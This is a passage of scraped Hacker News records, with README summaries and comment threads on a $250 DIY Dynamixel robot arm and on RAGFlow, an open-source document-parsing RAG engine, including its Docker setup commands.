    "title": "DIY $250 Robot Arm for Clothes Folding",
    "originLink": "https://github.com/AlexanderKoch-Koch/low_cost_robot",
    "originBody": "$250 Robot Arm This repository contains the files to build and control a low-cost robot arm that costs about $250. You can also build a second robot arm (the leader arm) to control the other arm (the follower arm). The design of the leader is inspired by the GELLO project but is simpler to build. Such a robot arm is well suited for robot learning (e.g. https://x.com/alexkoch_ai/status/1756500716854841835?s=20). Two of those arms are also capable of folding clothes (https://x.com/alexkoch_ai/status/1772750496174149708?s=20). This robot arm uses Dynamixel XL430 and Dynamixel XL330 servo motors. The XL430 motors are almost twice as strong and are used for the first two joints. The XL330 motors are weaker but weigh only 18g each. This makes the arm very lightweight and fast. Dynamixel sells the U2D2 adapter to connect the servos to a computer. However, this is very expensive and the latency is very high. This build uses another cheaper adapter board instead. The robot arm can be controlled with the Dynamixel SDK: pip install dynamixel-sdk Follower Arm Required Materials Part Cost Buying link Specs 2x Dynamixel xl430-w250 $100 https://www.robotis.us/dynamixel-xl430-w250-t/ https://emanual.robotis.com/docs/en/dxl/x/xl430-w250/ 4x Dynamixel xl330-m288 $96 https://www.robotis.us/dynamixel-xl330-m288-t/ https://emanual.robotis.com/docs/en/dxl/x/xl330-m288/ XL330 Idler Wheel $10 https://www.robotis.us/fpx330-h101-4pcs-set/XL430 Idler Wheel $7 https://www.robotis.us/hn11-i101-set/Serial bus servo driver board $10 https://a.co/d/7C3RUYUVoltage Reducer $4 https://a.co/d/iWJlp6A12V Power Supply $12 https://a.co/d/40o8uMNTable Clamp $6 https://a.co/d/4KEiYdVWires $7 https://a.co/d/hQfk2cbThere is usually a 10% discount code for the robotis shop. It might also help to add some grip tape to the gripper (e.g. https://a.co/d/dW7BnEN). A USB-C cable is necessary to connect the servo driver board to a computer. Assembly Video of the assembly: https://youtu.be/RckrXOEoWrk Print all parts with a 3D printer. The STL files are in hardware/follower/stl. The parts are designed to be easy to print. Only the moving part of the gripper needs supports. Assemble the arm without the base. Make sure that the servos are fixed in the same position as in the CAD. The servo horn should be in the default position when screwed in. Solder wires onto voltage reducer. Input should be connected to female connectors and the output to male connectors. Screw the voltage reducer and the servo driver board onto the base Screw the base onto the arm Connect D, V, and G ports on the driver board to the shoulder rotation servo Connect the shoulder rotation servo to the shoulder lift servo Connect the input for the voltage reducer to V and G ports on the driver board Connect the output of the voltage reducer and the remaining D port of the driver board to the elbow servo Connect the driver board to the power supply Connect the driver board to a computer (should work with Linux and macOS) Figure out the device name (e.g. /dev/tty.usbmodem57380045631) ls /dev/tty.* Scan the device with Dynamixel Wizard Connect to an XL330 servo and view the input voltage. Adjust the screw on the voltage reducer until the input voltage is 5V. Set the servo ids to 1 for the shoulder to 5 for the gripper servo Set the baudrate to 1M for all servos. Leader Arm Required Materials Part Cost Buying link Specs 6x Dynamixel xl330-w077 $144 https://www.robotis.us/dynamixel-xl330-m077-t/ https://emanual.robotis.com/docs/en/dxl/x/xl330-m077/ Serial bus servo driver board $10 https://a.co/d/7C3RUYU5v Power Supply $6 https://a.co/d/5u90NVpTable Clamp $6 https://a.co/d/4KEiYdVXL330 Frame $7 https://www.robotis.us/fpx330-s101-4pcs-set/The assembly of the leader arm is simpler since all motors use 5v. The gripper is replace by a handle and a trigger. During use, a small torque can be applied to the trigger so that it opens by default. The GELLO design uses a spring for this purpose but it is much more difficult to assemble. The teleoperation.py script can be used to test the arms. However, the device names might have to be adjusted.",
    "commentLink": "https://news.ycombinator.com/item?id=39902205",
    "commentBody": "Low Cost Robot Arm (github.com/alexanderkoch-koch)206 points by pbrowne011 6 hours agohidepastfavorite94 comments rini17 4 minutes agoWhy not start with something less ambitious, like low cost robot platform able to follow people and carry stuff around and avoid obstacles. No arms, I am okay using mine to put stuff on and off it. When I had leg injury and used crutches, carrying stuff around suddenly became a problem. There are many people with impaired movement. And even without that, I often misplace things and it could help there. There are plenty of toy robot undercarriages on aliexpress but too small (under 20cm largest dimnsion) to be practical. reply 7373737373 1 hour agoprevI'm surprised (or perhaps very unaware) that there doesn't seem to exist a company yet that mass produces cheap, high quality, reasonably standardized robot arms. So many things like 3D printers or CNC machines have entered the consumer/amateur level price realm, but this seems to be something still largely unexplored. Seems to have Arduino/Raspberry Pi scale potential, but I haven't heard of a name/ecosystem that popular yet reply Itschris48 7 minutes agoparent- Arm wrestling a toddler? - Handwriting notes for small jewelry brand? - Drink mixer? - Handing towel when in the bathroom, then getting a new one? - Setting up my morning espresso? (grinding the beans and turning on the coffee machine) Which of those can/cannot be done and why? reply regularfry 1 hour agoparentprevThere have been a few around, but the limiting factor (as you can see from the BOM in the link) is the cost of the actuators. They get expensive fast. reply Ekaros 1 hour agoparentprevAlso I have understood that robot arms are in real life rather complicated to program to operate correctly. So any process would take substantial effort. Magnitude harder than controlling some relays or reading some sensor data. reply jfoutz 1 hour agorootparentI don't know, but I think the big real industrial kind can really really hurt or kill people. I think the limiter on smaller arms is quality servos with real location encoders - this one costs a couple hundred bucks for motors. Not claiming the software is easy! But I think sourcing parts is (or has been) really hard. reply TomK32 1 hour agorootparentprevWouldn't be the easiest way to program a robot to \"show\" it its task by simply moving the arm a few times in the paths it has to replicate afterwards? reply amatic 27 minutes agorootparentIn a controlled environment - where the object to pick up, for example, is always in exactly the same location - you could do that. If there is any variation in the location of the object, you need vision to localize it each time. You need a camera, maybe two, and probably some kind of 3d perception, which is an unsolved problem at the moment (well, not solved in a general way, there are some solutions for specific objects). reply iLoveOncall 1 hour agoparentprevSkimming through this threads and the various answers to the multiple \"has anyone found a use for a robotic arm?\" questions will explain why there's no such company. There simply is no consumer-grade market. reply 7373737373 1 hour agorootparentA lack of applications hasn't prevented the sale of a large number of Arduinos lol reply 0xEF 51 minutes agorootparentArduinos are for prototyping, which makes the application fairly massive. The company I work for used them to develop one of our machines before we moved to a custom board. So, I'd say they are pretty useful. reply 7373737373 43 minutes agorootparentAgreed, they certainly can be/are useful (and fun!), in a multitude of ways, but all too often I've also encountered peoples' \"complaints\" that they bought a bunch and now don't have a use case for it/are searching for one :) reply moffkalast 58 minutes agorootparentprevYou can use an Arduino for virtually anything though. A robot arm can only move stuff around. reply adaml_623 1 hour agoparentprevI don't think we've figured out how to make good cheap mechanical actuators. I think that engineers make do with inaccurate actuators by changing the mechanism around it. Robot arms need a level of reliability that isn't cheap yet. reply isquaredr 4 hours agoprevThe geek in me is drooling, but are there any practical home uses others have found for robotic arms? Hacking is always more fun with a good project reply greggsy 3 hours agoparentI’d use it to pick through and sort the massive pile of Lego my children leave behind after an Easter long weekend. Seems trivial to do identification based on the high quality corpus of block databases. Wouldn’t have to be super quick - you could just leave it running overnight. I’m sure someone’s written an interesting paper on the ideal sorting algorithm too (i.e. large things > small things vs. ‘just pick up and place the nearest thing’.) I would personally just get it to sort them into basic sets before placing the trays back in their goddamn drawers. reply Max-q 44 minutes agorootparentI think the easiest way to collect the Lego pieces from the floor is by using a vacuum cleaner. Then look at the sorting as a separate problem :) reply michaelt 1 hour agorootparentprev> Seems trivial Said like someone who's never tried it :) For a start you're going to need a camera. Maybe more than one. You want depth sensing? Even an cheap choice like a RealSense is going to add another $250 to your costs. And you'll need a sturdy mount for it, the robot's going to vibrate the table and you don't want to suffer motion blur. Got the camera in a fixed location, over the area you're picking from? Then the robot's going to block the camera's view when it reaches in. No real-time hand eye coordination for you. Putting the camera on the robot's wrist? Now you've got motion blur problems - and reliability problems, because normal USB cables aren't designed for continuous flexing. You've also got a gripper in view all the time - and now the camera moves, things are always out of focus. The reach of the arm isn't long enough to give you many bins to drop items off into, considering the number of lego parts there are. The longer you make the arm, the greater the torque at the shoulder joint. Making the motors bigger? Now the elbow motor is heavier. Gearing them down? Now you've got gear backlash. Your Dynamixels will break, for some reason. Maybe eventually you'll figure out why. In the meantime, $50 each please. Parts like the small satellite dish https://www.bricklink.com/v2/catalog/catalogitem.page?P=4740... will prove very hard to grasp. And there's like 50 different colours, you're going to need to know your way around lighting and camera settings if you want to reliably tell transparent light blue, transparent medium blue and transparent dark blue apart. And that's before you get into questions like how to tell a 2x4 stud brick apart from two 1x4 stud bricks next to each other - or how to grasp a brick when an adjacent brick is blocking you from getting in with the gripper. Every single one of these issues is solvable - but by the time you've solved them all? You could have hand-sorted that lego 20 times over :) reply otikik 2 hours agorootparentprevMy impression is that the fastest/easiest way to do it would be putting all the pieces inside hopper with the selector at the bottom. Perhaps using compressed air to push the falling pieces into different containers as they fall. I believe there’s already something like that in produce factories, separating vegetables by state/size. reply otikik 2 hours agorootparentOh look someone has already done something like that: https://www.youtube.com/watch?v=04JkdHEX3Yk reply boffinAudio 1 hour agorootparentI don't know why this can't just be a cleverly laid out arrangement of layered sieves, each one parsing a different object .. I don't see how it needs to be mechanical in any sense other than \"pour in the lego junk, out it comes neatly sorted\", a la coin-sorting machines .. reply IshKebab 3 hours agorootparentprevPicking up and sorting Lego with a robot arm is pretty much a state of the art research project (a few years ago at least), not a hobby project. reply Terr_ 2 hours agorootparentI imagine it is strongly affected by whether the pile is already decomposed into individual bricks or not. The analysis and disassembly of a combined set of bricks can frustrate even human eyes, brains, and fingertips. reply Grimblewald 2 hours agorootparentprevDepends on your defenition of hobby and if the hobby as part of it being enjoyable needs to produce something tangible in the short term. Following sota research, tinkering, trying new things in a field unrelated to your day job can be a fullfilling hobby. reply 4gotunameagain 2 hours agorootparentprevThe devil is in the details. In theory everything is trivial with enough SW dev hubris ;) Even just the path planning towards the block to ensure good grip and pick up is not a simple task. Consider all the block shapes, possible orientations, collisions.. reply dr_kiszonka 4 hours agoparentprevAn impractical use would be to have a few of them replace monitor arms in a multi monitor setup. You could then rapidly switch between a few configurations. Also, have one to stir pasta in the kitchen. reply throwaway38375 1 hour agorootparentOn the topic of automatically stirring pasta, I saw this the other day! https://www.amazon.com/StirMATE-Automatic-Variable-Self-Adju... reply vasco 1 hour agorootparentprevMulti monitor robot arm stands would do some cool things. An automated rotating sequence when you boot up would feel like a scifi movie. reply Havoc 3 hours agorootparentprevI doubt this is strong enough to carry a screen reply etrautmann 2 hours agorootparentprevPasta is one of the few things you’re not supposed to stir while cooking? reply dr_kiszonka 2 hours agorootparentI think you should stir it occasionally. It might depend on the pasta, though. https://www.thekitchn.com/kitchen-mysteries-why-stir-pas-112... reply euroderf 37 minutes agoparentprevDrinks mixer! Line up the booze bottles and other stuff. No need for brute strength. Tolerances of one or two millimeters are mostly fine. reply Animats 3 hours agoparentprevNot much. I have a UArm on my desk, which is a lot like this one but with cheaper servos. It was too inaccurate to use for much of anything. I built a force-feedback sensor for it out of a 3D mouse. Reasonable idea, but not stiff enougn for the application. reply mattlondon 1 hour agoparentprevHolding a water pistol to shoot at foxes in my garden might be useful. They other humane deterrents (ultrasonics etc) don't work. reply cocoflunchy 1 hour agorootparentYou don't really need a robot arm for this though... Also on my list of projects for cats :) reply boffinAudio 1 hour agoparentprevRoboexotica is screaming for a set of these arms to create a production line: http://roboexotica.at/ reply alex_suzuki 4 hours agoprevAnyone who finds this interesting might also like this one, it‘s not DIY – comes fully assembled: https://www.waveshare.com/roarm-m2-s.htm I have one and the build quality is really impressive for the price point. reply dr_kiszonka 4 hours agoparentNice. What do you use it for? reply alex_suzuki 4 hours agorootparentReproducible test scenarios for barcode scanning with a smartphone. reply devsda 1 hour agorootparentUnless it has to do something with the print quality itself, can't this be achieved using a stationary phone with its camera towards a monitor displaying 3D transformed barcode images ? reply alex_suzuki 1 hour agorootparentYes, possibly. But reading from the screen is quite different from reading actual barcode prints, for instance you have to deal with Moirè patterns and such. And frankly it was just a good excuse to buy an arm. Sue me! ;-) reply 2rsf 1 hour agorootparentprevI wish I had it a decade ago when I tested phone touch screens reply dr_kiszonka 3 hours agorootparentprevVery clever. This use case would never cross my mind. reply ipsum2 4 hours agoparentprevHow is the software support? reply alex_suzuki 4 hours agorootparentI‘ve only just started using it via the web UI, no idea. reply moffkalast 2 hours agoparentprevThere's also the 5-dof version that I've seriously considered buying at one point, but it's really hard to tell if the ROS 2 integration is any good: https://www.waveshare.com/product/robotics/roarm-m1.htm A real shame there isn't a 6-dof one, since that's what you'd really need to grasp anything properly in the radius around the arm. reply jerzmacow 5 hours agoprevWow, I was building a Thor 3D printed arm, and this project looks way better! I think I'm going to Pivot. Side bar: these servos are a game changer. reply brcmthrowaway 3 hours agoparentAre the servos better than SG90? reply michaelt 11 minutes agorootparentThey're \"smart\" which means you can form a serial bus of them, query individual motors' encoder positions and motor temperatures and whatnot, adjust the PID parameters yourself, and so on. You can also daisy-chain them together, which might reduce your cable routing problems. Downside is when they break, you're out $50 or more - and you're going to break at least one. And the manufacturer wants you to operate them at 11.1v which isn't very convenient. And when it comes down to it, it's still got plastic gears, a plastic case, and enough backlash to be noticeable. reply regularfry 1 hour agorootparentprevDramatically. They cost (give or take) ten times more and weigh twice as much, for which you get (give or take) four times the stall torque, serial positional control, and a 360 degree range of motion. Still got plastic gears though. reply cs2818 2 hours agoprevAs a longtime Dynamixel user I agree the U2D2 adapter is pricey in comparison to other options, but I would like some quantification of the “latency is very high” claim. I have always found it to be a sure bet for low latency (~1ms) across a wide variety of platforms. reply alexanderkoch 51 minutes agoparentIt works fine with Linux. The latency issues only exists with macos. https://forum.robotis.com/t/u2d2-high-latency/5319 reply SSNLF 1 hour agoprevIt's cool but just reminds me of the robotic manipulation episode of big bang theory. reply potatoman22 5 hours agoprevI printed a robotic arm for school. Unfortunately, we weren't using a high quality enough printer, so the tolerances were off and things didn't slot together well. I'd recommend people to know the precision of their printer before setting off to build this. reply dailykoder 4 hours agoparentLearning this is part of the journey imho. You don't even have to know that you have to pay attention to tolerances beforehand. You'll inevitably learn about it when building such thing. Just always be aware that these things will never be perfect and don't get anxious because there are so many perfect looking projects on the internet. They most likely went through the same mistakes and might even have more people in the background. Just enjoy the journey reply moffkalast 11 minutes agoparentprevIt's not so much the printer's fault as the slicer's. Calibration is key. reply throwup238 4 hours agoparentprevAlternatively, make everything just a tad out of tolerance and drill/sand/machine it to a more precise size. reply steve_adams_86 3 hours agorootparentI tend to do this. I know I could get better at printing (though my printer is pretty old), but sand paper and a rotary tool are really fast and can be pretty precise and accurate too. reply easygenes 5 hours agoprevAnyone know how the accuracy of this compares to the similar-cost adamb314/ServoProject arm? [1] It utilizes a servo mod adding dual encoders to compensate for backlash and achieves accuracy of +/- 0.05mm (enough to thread a mechanical pencil lead in and out of the tip of a pencil). [2] He's been working on the project for 5 years, with significant improvements still in the last year. [3][4] [1]: https://github.com/adamb314/ServoProject [2]: https://www.youtube.com/watch?v=SioCwvR_PYY [3]: https://www.youtube.com/watch?v=_4mrb2T706s [4]: https://www.youtube.com/watch?v=Ctb4s6fqnqo reply serf 4 hours agoparentit should be similar given similar construction; one of the reasons dynamixels tend to be pricey is the dual inboard encoder setup. if price is a factor then a servo+encoders setup will always be cheaper; there are some dirt cheap encoders out there for the creative hacker. dynamixels offer a crappy value compared to DIY solutions, they're just easy to use off-the-shelf and have nice features that aid construction.. but hardly anything game changing. reply throwup238 4 hours agorootparent> but hardly anything game changing. Speak for yourself! When I worked on liquid handlers a decade ago the fully integrated servos were at least ten times as expensive as they are now. Every time I step away for a few years and jump back in, there seems to be at least a half dozen game changing pieces of hardware on the market. reply omeze 2 hours agoprevIm currently waiting on the motors for this, but my bambu p1s printed out the parts with minimal stringing in like 90 mins. Really to try it out for cooking experiments reply ipsum2 4 hours agoprevDoes anyone have any suggestions on something that's a little higher quality, i.e. more torque and larger, like the size of a UR5 but cheaper than $30k? There's always seems to be a gap between \"robot arm with dynamixels/off the shelf servos\" and \"research-grade arms\". reply TaylorAlexander 2 hours agoparentI’m very happy with the mechanical design for my four axis brushless motor powered robot arm with integrated 3D printed planetary gearboxes. I have some hope of picking the project back up and better documenting it, though the CAD files explain a lot. For the last few years I’ve been working on my own brushless motor controller design and I think this year I will have that stable enough to go back to working on this arm. https://github.com/tlalexander/brushless_robot_arm https://github.com/Twisted-Fields/rp2040-motor-controller Direct link to a video of it operating (apologies for the Twitter link) here: https://x.com/tlalexander/status/1455339851734138880 reply coryrc 2 hours agorootparentPretty neat! As a fellow motor controller designer, I worry you're wasting time reinventing the wheel in that regard, but I really like your project, I also want a farming robot. reply TaylorAlexander 2 hours agorootparentThanks. I specifically want something that is designed in kicad, open source, and easy to manufacture at JLCPCB using parts already in stock there. Maybe there are more options now but two years ago when the Odrive we were using was discontinued and their new products got more closed source and more expensive, we didn’t have a lot of options. At this stage I’m very happy we’ve gone with our own design because we have so much flexibility on packaging and specification. Working with third party devices sucked. reply SirWart 2 hours agoparentprevThere are a couple of arms commonly used in research around the $10k mark, namely the Franka Emika and UFACTORY xArm 6. The ALOHA project uses the ViperX 300 6DoF, which is around $6500 but uses higher quality dynamixels with aluminum parts and bills itself as \"research grade\". I have one of these and I'd say it's expensive for what you get, but still cheaper than the \"factory grade\" robots. I will need a bimanual setup eventually and I'm probably going to get either an Emika or xArm since I'm already hitting the weight limits of the ViperX. reply antoniuschan99 3 hours agoparentprevI have a dobot mg400 but there are quite a few others: uFactory, elephant robotics, annin, dorna, epson (vt6L and their scaras), and lynxmotion is releasing their ses-v2. reply ipsum2 3 hours agorootparentWow, thanks for the list of resources. My problem with most robot arms are either they have small payloads, accuracy isn't very high, are too slow, or software support is terrible. Do you have any specific suggestions for 6DoF? The MG400 looks to have 4. reply antoniuschan99 3 hours agorootparentMg400 is great for the price no issues. Very smooth! Check out this review video: https://youtu.be/6nGexb_i0aM?si=IP0E76MCGxrTrQEH What payload are you looking for? Cartesian Gantry’s are your next bet if you want to handle higher loads. Eg. Epson vt6l is ~14k but I’m sure you can build a gantry system to handle higher loads for a bit less! Dobot software sucks though, I ended up programming it in python. It’s definitely not on the same level as say a Kuka or Yaskawa. Epson seems like the best value out of all the higher end arms. Software looks good, the arms are built well, has a long history in industry, and price is decent reply dosssman 3 hours agoparentprevProbably not UR5 size, but Aloha robot arm sounds like something you might be interested in: https://www.trossenrobotics.com/aloha-kits reply ipsum2 3 hours agorootparentThanks for the link, I would categorize this robot as \"robot with off-the-shelf servo\". reply moooo99 3 hours agoparentprevI‘m not sure as far as your technical requirements go, maybe Igus.eu would fit your needs? They do have a fairly good robot automation portfolio that seems to be very price competitive as far as I can tell reply ipsum2 3 hours agorootparentTheir rebel cobot looks really neat, and price seems great! reply MaxikCZ 4 hours agoprevI want the arm to wander around my house, pick up articles of loose clothing and put them into washing machine. Then pull them out and spread them on a drying hanger. How far away from that are we? reply fragmede 3 hours agoparentThat's it, isn't it. The question is not, how far away from that are we, but when can you and I actually afford it? Because, as the other commenter snarkily replies, human maids already exist. The lifestyle of the singularity is already here for the rich. It's trickling down that kind of lifestyle to the rest of us that AI robots will enable. (with some amount of social upheaval.) Lets say the robot that can do that comes out next year for $15 million. Could you afford one? I certainly can't. So pretend that it does, what changes for you and I? Nothing. So the robots that can do that won't be used as robot maids until the price comes down. Which; it will. Open source robotics and model-available AI will force things to be affordable sooner, rather than later, because we'd all like a robot to do that for us. Along with be in the kitchen, doing dishes, cleaning up; cleaning the bathroom, doing yardwork, making my bed. The industrial versions will be used to do hideously dangerous things. underwater welding, chainsaw helicoptering, manual nuclear reactor rod removal. We already use machines for a lot of those difficult/impossible tasks, it's just a matter of programming the robots. Which takes us back to today. How far away from that are we? The pieces are already here. Between https://ok-robot.github.io/ and https://mobile-aloha.github.io/ the building blocks are here. It's just a matter of time before someone puts the existing pieces together to make said robot, the only question is who will be first to make it, who will be first to open source it. Who will make it not just possible, but affordable? reply hatthew 2 hours agorootparentI think even more difficult than making it affordable will be making it reliable. OK-Robot says it has has a 1/3 failure rate, and takes ~20x as long as a human, at which point you might as well do the task yourself. I'd want the error rate and speed improved by an order of magnitude before I'd consider it anything other than a fun novelty. reply dandaka 1 hour agorootparentAI technology is advancing at an exponential rate currently. The inquiry remains whether there's a limit to these technologies' potential. reply pulse7 4 hours agoparentprevIt has been here for several millennia... it even has two legs to walk around and two rotating cameras connected to a very powerful LLM... reply yjftsjthsd-h 4 hours agorootparentNah, that model is expensive and buggy, not to mention closed source. reply Ekaros 1 hour agorootparentDepends where you live... In some places those models are entirely affordable. But likely will also there get less and less affordable. reply melagonster 3 hours agorootparentprevbut it work. I can't believe that we choose from different robots. reply TaylorAlexander 2 hours agoparentprevGoogle X was working on that with Everyday Robots (I used to work there) but they canceled the project. One of their old project leaders left and started Hello Robot, which is doing a much better job producing an actually useful thing. I think those robots are maybe $25k, but I’m not actually sure. reply 7373737373 56 minutes agoparentprevPerhaps you could ask Twitch Chat to do that for you: https://youtu.be/uzWNgoYJLqM reply cocoflunchy 3 hours agoparentprevNot so far for the first part: https://wholebody-b1.github.io/ reply IshKebab 2 hours agoparentprevDefine \"we\". Professional SotA? Probably like 10 years. Open source? More like 100. reply imtringued 4 hours agoparentprevhttps://youtube.com/watch?v=HaaZ8ss-HP4 A decade at most? reply NalNezumi 5 hours agoprevI've built my own GELLO setup (the setup the author based it's arm on) and it's quite neat, but as I only use it for teleoperation of an real arm, I wonder how useful this low cost arm really is? Considering limited range, probably backlash, and the limited torque Also it doesn't seems to use springs like GELLO which was a nice add, although the 3D printed parts where the spring was mounted broke quickly. reply jack_riminton 1 hour agoprevIs there a video of it working anywhere? reply alexanderkoch 50 minutes agoparentI've published quite a few videos on Twitter: https://twitter.com/alexkoch_ai reply fragmede 4 hours agoprevHow's the software side of this? How is the Dynamixel SDK to use? reply gnarlouse 3 hours agoprevThis is fantastic! Thank you so much reply hyperswine 3 hours agoprevwow, thats really amazing. Are you a hardware engineer? reply NeilSmith2048 1 hour agoprev [–] its really cool! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A repository is available for constructing and operating an affordable robot arm priced at $250, designed for a leader arm to control a follower arm, with the capability to fold clothes.",
      "The robot arm utilizes Dynamixel XL430 and XL330 servo motors and can be managed through the Dynamixel SDK, with assembly involving multiple materials, 3D printing components, and servos connection to a computer.",
      "The leader arm is easier to assemble, equipped with a handle and trigger for gripping, and testing the arms can be done using the teleoperation.py script."
    ],
    "commentSummary": [
      "The GitHub discussion delves into the feasibility of an inexpensive and user-friendly robotic arm, proposing simpler robot designs without arms for tasks like item carrying.",
      "Challenges such as expensive actuators, complex programming, and part acquisition hurdles are highlighted in the conversation.",
      "Companies are launching diverse robotic arms, sparking debates on the current technology's dependability and cost-effectiveness for household and industrial tasks, as well as the limitations of low-cost arms for teleoperation in terms of range, torque, and reliability."
    ],
    "points": 206,
    "commentCount": 94,
    "retryCount": 0,
    "time": 1712029818
  },
  {
    "id": 39896923,
    "title": "RAGFlow: Cutting-edge Open-source RAG Engine for Document Understanding",
    "originLink": "https://github.com/infiniflow/ragflow",
    "originBody": "English简体中文 💡 What is RAGFlow? RAGFlow is an open-source RAG (Retrieval-Augmented Generation) engine based on deep document understanding. It offers a streamlined RAG workflow for businesses of any scale, combining LLM (Large Language Models) to provide truthful question-answering capabilities, backed by well-founded citations from various complex fomatted data. 🌟 Key Features 🍭 \"Quality in, quality out\" Deep document understanding-based knowledge extraction from unstructured data with complicated formats. Finds \"needle in a data haystack\" of literally unlimited tokens. 🍱 Template-based chunking Intelligent and explainable. Plenty of template options to choose from. 🌱 Grounded citations with reduced hallucinations Visualization of text chunking to allow human intervention. Quick view of the key references and traceable citations to support grounded answers. 🍔 Compatibility with heterogeneous data sources Supports Word, slides, excel, txt, images, scanned copies, structured data, web pages, and more. 🛀 Automated and effortless RAG workflow Streamlined RAG orchestration catered to both personal and large businesses. Configurable LLMs as well as embedding models. Multiple recall paired with fused re-ranking. Intuitive APIs for seamless integration with business. 🔎 System Architecture 🎬 Get Started 📝 Prerequisites CPU >= 2 cores RAM >= 8 GB Docker If you have not installed Docker on your local machine (Windows, Mac, or Linux), see Install Docker Engine. 🚀 Start up the server Ensure vm.max_map_count > 65535: To check the value of vm.max_map_count: $ sysctl vm.max_map_count Reset vm.max_map_count to a value greater than 65535 if it is not. # In this case, we set it to 262144: $ sudo sysctl -w vm.max_map_count=262144 This change will be reset after a system reboot. To ensure your change remains permanent, add or update the vm.max_map_count value in /etc/sysctl.conf accordingly: vm.max_map_count=262144 Clone the repo: $ git clone https://github.com/infiniflow/ragflow.git Build the pre-built Docker images and start up the server: $ cd ragflow/docker $ docker compose up -d The core image is about 15 GB in size and may take a while to load. Check the server status after having the server up and running: $ docker logs -f ragflow-server The following output confirms a successful launch of the system: ____ ______ __ / __ \\ ____ _ ____ _ / ____// /____ _ __ / /_/ // __ `// __ `// /_ / // __ \\|/| / / / _, _// /_/ // /_/ // __/ / // /_/ /| |/ |/ / /_/ |_| \\__,_/ \\__, //_/ /_/ \\____/ |__/|__/ /____/ * Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:9380 * Running on http://172.22.0.5:9380 INFO:werkzeug:Press CTRL+C to quit In your web browser, enter the IP address of your server as prompted and log in to RAGFlow. In the given scenario, you only need to enter http://172.22.0.5 (sans port number) as the default HTTP serving port 80 can be omitted when using the default configurations. In service_conf.yaml, select the desired LLM factory in user_default_llm and update the API_KEY field with the corresponding API key. See ./docs/llm_api_key_setup.md for more information. The show is now on! 🔧 Configurations When it comes to system configurations, you will need to manage the following files: .env: Keeps the fundamental setups for the system, such as SVR_HTTP_PORT, MYSQL_PASSWORD, and MINIO_PASSWORD. service_conf.yaml: Configures the back-end services. docker-compose.yml: The system relies on docker-compose.yml to start up. You must ensure that changes to the .env file are in line with what are in the service_conf.yaml file. The ./docker/README file provides a detailed description of the environment settings and service configurations, and you are REQUIRED to ensure that all environment settings listed in the ./docker/README file are aligned with the corresponding configurations in the service_conf.yaml file. To update the default HTTP serving port (80), go to docker-compose.yml and change 80:80 to :80. Updates to all system configurations require a system reboot to take effect: $ docker-compose up -d 🛠 Build from source To build the Docker images from source: $ git clone https://github.com/infiniflow/ragflow.git $ cd ragflow/ $ docker build -t infiniflow/ragflow:v1.0 . $ cd ragflow/docker $ docker compose up -d 📜 Roadmap See the RAGFlow Roadmap 2024 🏄 Community Discord Twitter 🙌 Contributing RAGFlow flourishes via open-source collaboration. In this spirit, we embrace diverse contributions from the community. If you would like to be a part, review our Contribution Guidelines first.",
    "commentLink": "https://news.ycombinator.com/item?id=39896923",
    "commentBody": "RAGFlow is an open-source RAG engine based on OCR and document parsing (github.com/infiniflow)182 points by marban 16 hours agohidepastfavorite46 comments mpeg 11 hours agoTook me some time to figure out how to run it, but the layout recogniser model hosted on huggingface is pretty good! It correctly identifies tables that even paid models like the AWS Textract Document Analysis API fails to – for instance tables with one column which often confuse AWS even if they have a clear header and are labelled \"Table\" in the text. I would however love to know broadly what kind of document it was trained on, as my results could be pure luck, hard to say without a proper benchmark Very nice layout recognition, although I can't quite comment on the RAG performance itself – I think some of the architecture decisions are odd, it mixes a bunch of different PDF parsers for example which will all result in different quality and it's not clear to me which one it defaults to as it seems to be different in different places in the code (the simple parser defaults to pypdf2 which is not a great option) reply vissidarte_choi 4 hours agoparentThis is because PDF has so many different versions. A third-party tools like pdfplumber won't fit it all. For example, using pdfplumber to parse some PDFs will cause the system to raise exceptions. Sometimes fitz works in situations where pdfplumber won't handle well. It looks a bit complicated, but RAGFlow is using multiple parsing tools to handle different types of PDFs. reply shekhar101 10 hours agoparentprevWhat's the name of the layout recorgniser model? I did not have a good experience extracting layout from tables, especially those without column boundaries (space instead of lines to demarcate boundaries) reply mpeg 9 hours agorootparentit's https://huggingface.co/InfiniFlow/deepdoc and the code for usage is in https://github.com/infiniflow/ragflow/blob/main/deepdoc/READ... – it took me a bit of trial and error to get it working It seems to be a YOLOv8 fine-tune, I only did a couple tests but results were decent. Another model that is supposed to be fine tuned for borderless is https://huggingface.co/keremberke/yolov8m-table-extraction but I haven't had great results myself with it, but maybe worth a try for you. reply shekhar101 8 hours agorootparentThank you very much! reply bgun 8 hours agoprevI know this is just an open source project but it’s a good example of why you might want to consult a woman before naming things. reply hitekker 7 hours agoparentThe assumption that author didn't talk to a woman sounds pretty knee-jerk to me. Can you explain what you mean? \"On the rag\" is a semi-common slang for menstruation, but \"rag\" has way more meanings than just menstrual pads. IMO, as a marketing term, \"RAGflow\" sounds about as odd as \"Nintendo Wii\". reply bgun 7 hours agorootparentNot sure if sarcasm but 'about as odd as \"Nintendo Wii\"' kind of makes my point: https://web.archive.org/web/20130623080716/http://www.forbes... http://news.bbc.co.uk/2/hi/technology/4953650.stm https://www.cbc.ca/news/entertainment/why-wii-ask-nintendo-1... reply nmfisher 7 hours agoparentprevPeople said the same thing about the iPad. reply scrollaway 8 hours agoparentprevThe authors are not native English speakers (and what you’re seeing in the name is not something most non native English speakers would spot). I understand it’s funny to point and laugh “ha ha dumb dudes didn’t think about something female related because they’re dudes”, but it’s worth remembering that not everyone is from the anglosphere. Also you might find this normal but I cannot imagine my female colleagues being amused at me calling one of them up asking to “consult” about a name solely because she’s a woman. reply bgun 7 hours agorootparentI didn't point it out because it was funny-ha-ha, but because it's a teachable example of a linguistic mis-step that could be easily resolved by diversifying your reviewers - in this case, since you mention it, perhaps a native English speaker? I'm not even suggesting that this project needs a new name - although I think if they were naming a consumer-facing product or company, someone in marketing would push back on the name almost immediately. reply kaliqt 6 hours agorootparentAs a native English speaker I would not dock points from this name for the gender related points as that doesn't even cross my mind, it's not relevant. Keep gender out of engineering. reply kadoban 6 hours agorootparentprev> Also you might find this normal but I cannot imagine my female colleagues being amused at me calling one of them up asking to “consult” about a name solely because she’s a woman. I'd certainly hope it wouldn't be \"solely\" because she's a woman. There's no people you'd be interested in input from that happen to be women? A project name is something you'd want to throw around to a few people (ideally with different perspectives) and make sure it conveys what you intend and has the right tone and such. reply yingfeng 5 hours agoparentprevHi, buddy, I'm sorry to make you feel like we don't take women's voices into account. We came up with this name because RAG is already a consensus, as an acronym for retrieval augmented generation, RAG is used in many places, and we think it would actually be a 